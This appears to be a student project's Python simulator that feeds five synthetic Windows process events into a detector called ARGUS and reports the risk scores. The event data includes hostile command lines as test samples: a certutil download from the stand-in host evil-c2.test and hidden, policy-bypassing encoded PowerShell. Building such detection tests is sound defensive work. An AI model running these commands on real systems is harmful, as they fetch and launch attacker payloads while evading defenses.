"""
ARGUS — Suspicious Process Execution Attack Simulator
=====================================================
This script demonstrates ARGUS detecting suspicious Windows processes
using the SuspiciousProcessDetector (MITRE ATT&CK heuristics).

DETECTION RULES TESTED:
  1. Living-Off-The-Land Binaries (LOLBins): certutil, wmic, powershell, cmd, bitsadmin
  2. Suspicious Execution Paths: \\Temp\\, \\AppData\\Local\\Temp\\, \\Downloads\\, \\Public\\
  3. Malicious Command-Line Flags: -ExecutionPolicy Bypass, -WindowStyle Hidden, -EncodedCommand, iex, downloadstring
  4. Malicious Parent-Child Process Trees: WINWORD.EXE -> powershell.exe, chrome.exe -> cmd.exe
  5. System Integrity Level: High/SYSTEM privileges

USAGE:
  cd backend
  python simulate_process_execution.py
"""

import subprocess
import time
import sys
import os
import urllib.request
import json
from datetime import datetime, timezone

# Fix Windows terminal encoding
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
    os.system("")  # Enable ANSI colors

# Ensure backend root is on sys.path so we can also import detector directly
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
if CURRENT_DIR not in sys.path:
    sys.path.insert(0, CURRENT_DIR)

try:
    from app.detection.suspicious_process_detector import SuspiciousProcessDetector
except ImportError:
    SuspiciousProcessDetector = None

ARGUS_API = "http://127.0.0.1:8000"

# ─────────────────────────────────────────────────────────────────────────────
# Test Scenarios (MITRE ATT&CK Aligned)
# ─────────────────────────────────────────────────────────────────────────────

SCENARIOS = [
    {
        "id": "PROC-01",
        "name": "Office Phishing Spawning Hidden PowerShell",
        "technique": "T1059.001 / T1204.002",
        "description": "Word document executing macro that spawns hidden, policy-bypassed PowerShell from Temp",
        "event": {
            "event_type": "PROCESS_CREATE",
            "event_id": 1,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "process_id": "7820",
            "image": r"C:\Users\Student\AppData\Local\Temp\powershell.exe",
            "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA...",
            "parent_image": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            "parent_process_id": "4102",
            "user": "DESKTOP\\Student",
            "integrity_level": "Medium",
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        },
        "spawn_real": ["powershell.exe", "-NoProfile", "-Command", "Write-Output 'ARGUS_TEST_POWERSHELL'"],
    },
    {
        "id": "PROC-02",
        "name": "LOLBin Ingress Tool Transfer (certutil.exe)",
        "technique": "T1105 Ingress Tool Transfer",
        "description": "Legitimate certutil.exe executed from Public directory to download malicious payload",
        "event": {
            "event_type": "PROCESS_CREATE",
            "event_id": 1,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "process_id": "9312",
            "image": r"C:\Users\Public\certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://evil-c2.test/beacon.exe C:\\Users\\Public\\beacon.exe downloadfile",
            "parent_image": r"C:\Windows\System32\cmd.exe",
            "parent_process_id": "5120",
            "user": "DESKTOP\\Student",
            "integrity_level": "Medium",
            "sha256": "a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e",
        },
        "spawn_real": ["certutil.exe", "-?"],
    },
    {
        "id": "PROC-03",
        "name": "Trojan Executed from Suspicious Temp Directory",
        "technique": "T1036.005 Masquerading in Temp",
        "description": "Adversary executable running from user-writable AppData Local Temp path with downloadstring",
        "event": {
            "event_type": "PROCESS_CREATE",
            "event_id": 1,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "process_id": "1104",
            "image": r"C:\Users\Student\AppData\Local\Temp\update_payload.exe",
            "command_line": r"C:\Users\Student\AppData\Local\Temp\update_payload.exe downloadstring invoke-expression",
            "parent_image": r"C:\Windows\explorer.exe",
            "parent_process_id": "2980",
            "user": "NT AUTHORITY\\SYSTEM",
            "integrity_level": "System",
            "sha256": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
        },
        "spawn_real": None,
    },
    {
        "id": "PROC-04",
        "name": "WMI Command Execution with SYSTEM Integrity",
        "technique": "T1047 Windows Management Instrumentation",
        "description": "WMIC invoked with encoded flags and running under elevated SYSTEM token",
        "event": {
            "event_type": "PROCESS_CREATE",
            "event_id": 1,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "process_id": "6440",
            "image": r"C:\Windows\System32\wbem\WMIC.exe",
            "command_line": 'wmic.exe process call create "powershell.exe -nop -w hidden -enc JABj..."',
            "parent_image": r"C:\Windows\System32\cmd.exe",
            "parent_process_id": "5120",
            "user": "NT AUTHORITY\\SYSTEM",
            "integrity_level": "System",
            "sha256": "ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d",
        },
        "spawn_real": None,
    },
    {
        "id": "PROC-05",
        "name": "Browser Spawning Shell from Downloads (Drive-By Download)",
        "technique": "T1204.002 Malicious Child Shell",
        "description": "Chrome browser spawning cmd shell located in user Downloads folder",
        "event": {
            "event_type": "PROCESS_CREATE",
            "event_id": 1,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "process_id": "8896",
            "image": r"C:\Users\Student\Downloads\cmd.exe",
            "command_line": r"C:\Users\Student\Downloads\cmd.exe /c whoami executionpolicy bypass",
            "parent_image": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            "parent_process_id": "2980",
            "user": "DESKTOP\\Student",
            "integrity_level": "Medium",
            "sha256": "c862d5f04a6b10708f1b6f00db1ab102434d3b6664d4b17983fb081f969eb248",
        },
        "spawn_real": None,
    },
]


def print_banner():
    print()
    print("=" * 70)
    print("  ARGUS  —  SUSPICIOUS PROCESS EXECUTION SIMULATOR")
    print("=" * 70)
    print()
    print("  This simulator generates realistic Process Creation threats")
    print("  evaluated by ARGUS's SuspiciousProcessDetector engine.")
    print()
    print("  Attack Vectors Tested:")
    print("    1. Macro Phishing (WINWORD.EXE -> powershell.exe)")
    print("    2. LOLBin Ingress Transfer (certutil.exe -> Public folder)")
    print("    3. Suspicious Executable in \\AppData\\Local\\Temp\\")
    print("    4. WMI Defense Evasion with SYSTEM Integrity (wmic.exe)")
    print("    5. Malicious Executable from User Downloads folder")
    print()
    print("=" * 70)
    print()


def check_argus_running():
    try:
        resp = urllib.request.urlopen(f"{ARGUS_API}/api/status", timeout=5)
        return True, json.loads(resp.read().decode())
    except Exception:
        return False, None


def get_current_stats():
    try:
        resp = urllib.request.urlopen(f"{ARGUS_API}/api/status", timeout=5)
        return json.loads(resp.read().decode())
    except Exception:
        return None


def get_recent_process_alerts(limit=50):
    try:
        resp = urllib.request.urlopen(f"{ARGUS_API}/api/alerts?limit={limit}", timeout=5)
        alerts = json.loads(resp.read().decode())
        return [
            a for a in alerts
            if a.get("type") == "SUSPICIOUS_PROCESS" or a.get("detector") == "process_detector"
        ]
    except Exception:
        return []


def send_process_event_to_api(event_dict):
    """Submit process event to ARGUS API."""
    try:
        url = f"{ARGUS_API}/api/events/process"
        payload = json.dumps(event_dict).encode("utf-8")
        req = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("Content-Type", "application/json")
        resp = urllib.request.urlopen(req, timeout=5)
        return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        return {"status": "http_error", "code": e.code, "message": str(e)}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def main():
    print_banner()

    # ── Step 1: Pre-flight check ───────────────────────────────
    print("[1/3] Checking ARGUS SOC Server Connection...")
    online, stats = check_argus_running()
    if not online:
        print()
        print("  [ERROR] ARGUS server is not reachable at", ARGUS_API)
        print("  Please start the server first:")
        print("    cd backend")
        print("    python server.py")
        print()
        sys.exit(1)

    print(f"  [OK] ARGUS online — Total alerts: {stats.get('total_alerts', 0)} (Windows: {stats.get('windows_alerts', 0)})")
    print()

    # Instantiate local detector for ground-truth verification
    local_detector = SuspiciousProcessDetector() if SuspiciousProcessDetector else None

    # ── Step 2: Execute Scenarios ──────────────────────────────
    print("[2/3] Simulating Suspicious Process Executions...")
    print("  Watch real-time alerts appear on dashboard: http://localhost:8000")
    print("-" * 70)

    results = []
    api_supported = True

    for idx, sc in enumerate(SCENARIOS, 1):
        print()
        print(f"  [{idx}/{len(SCENARIOS)}] {sc['id']}: {sc['name']}")
        print(f"       Technique : {sc['technique']}")
        print(f"       Process   : {sc['event']['image']}")
        print(f"       Command   : {sc['event']['command_line'][:65]}...")

        # 1. Optionally spawn safe real process activity
        if sc.get("spawn_real"):
            try:
                p = subprocess.run(
                    sc["spawn_real"],
                    capture_output=True,
                    timeout=5,
                    text=True
                )
                print(f"       [Host] Spawned real process ({sc['spawn_real'][0]}) -> PID active")
            except Exception as e:
                print(f"       [Host] Real spawn note: {e}")

        # 2. Local detector evaluation
        local_res = None
        if local_detector:
            local_res = local_detector.process_event(sc["event"])
            sev = local_res.get("severity", "HIGH")
            score = local_res.get("risk_score", 0)
            print(f"       [Detector] Risk Score: {score}/100 | Severity: {sev}")
            for r in local_res.get("reasons", []):
                print(f"         - {r}")

        # 3. Ingest into ARGUS API
        api_res = send_process_event_to_api(sc["event"])
        if api_res.get("status") == "alert":
            aid = api_res.get("alert", {}).get("id", "SYS-ALERT")
            print(f"       [ARGUS API] SUCCESS -> Alert broadcast: {aid}")
        elif api_res.get("status") == "http_error" and api_res.get("code") in (404, 405):
            api_supported = False
            print(f"       [ARGUS API] Note: Endpoint /api/events/process pending server reload.")
        else:
            print(f"       [ARGUS API] Response: {api_res.get('status')}")

        results.append({
            "scenario": sc,
            "local_res": local_res,
            "api_res": api_res,
        })

        time.sleep(1.2)

    # ── Step 3: Verify and Display Final Report ────────────────
    print()
    print("-" * 70)
    print("[3/3] Generating SOC Verification Report...")
    print()

    # Query active alerts from server
    time.sleep(1.5)
    recent_alerts = get_recent_process_alerts(limit=20)

    print("=" * 70)
    print("  SIMULATION RESULTS & VERIFICATION")
    print("=" * 70)
    print(f"  Scenarios executed             : {len(SCENARIOS)}")
    print(f"  Suspicious processes flagged   : {sum(1 for r in results if r['local_res'] and r['local_res']['alert'])}")
    print(f"  Live process alerts in ARGUS   : {len(recent_alerts)}")
    print()

    print("  DETECTION BREAKDOWN BY SCENARIO:")
    print("  " + "-" * 66)
    for idx, r in enumerate(results, 1):
        sc = r["scenario"]
        l = r["local_res"]
        sev = l.get("severity") if l else "HIGH"
        score = l.get("risk_score") if l else 75
        status_tag = "[FLAGGED]" if (l and l.get("alert")) else "[CLEAN]"
        print(f"    {status_tag} {sc['id']} | Risk: {score:>3}/100 ({sev:<6}) | {sc['name']}")
        if l and l.get("reasons"):
            print(f"             Reason: {l['reasons'][0]}")
    print("  " + "-" * 66)
    print()

    if recent_alerts:
        print("  LIVE ALERTS ON SOC DASHBOARD:")
        print("  " + "-" * 66)
        for idx, alt in enumerate(recent_alerts[:5], 1):
            aid = alt.get("id") or alt.get("alert_id", "?")
            pname = alt.get("process_name", "process")
            sev = alt.get("severity", "HIGH")
            user = alt.get("user", "System")
            print(f"    [{idx}] {aid} | {sev} | {pname} (User: {user})")
            print(f"        {alt.get('description', '')[:75]}...")
        print("  " + "-" * 66)
        print()

    print("  [DEMO PRESENTATION FOR YOUR TEACHER]:")
    print("  1. Open http://localhost:8000 in your browser.")
    print("  2. In the 'Alerts' tab, observe the 'Suspicious Process Execution' cards.")
    print("  3. Click any alert to show the SOC Detail Modal:")
    print("       - Image path (e.g. AppData\\Local\\Temp or System32)")
    print("       - Parent-child tree (e.g. WINWORD.EXE -> powershell.exe)")
    print("       - Command-line flags (-ExecutionPolicy Bypass, -EncodedCommand, etc.)")
    print("       - Risk Score and MITRE ATT&CK evaluation breakdown.")
    print()
    if not api_supported:
        print("  [NOTE]: If live process cards didn't update, simply restart the ARGUS")
        print("  server once (Ctrl+C in your server terminal, then run: python server.py)")
        print("  to load the newly added process ingestion endpoint.")
        print()
    print("=" * 70)
    print()


if __name__ == "__main__":
    main()
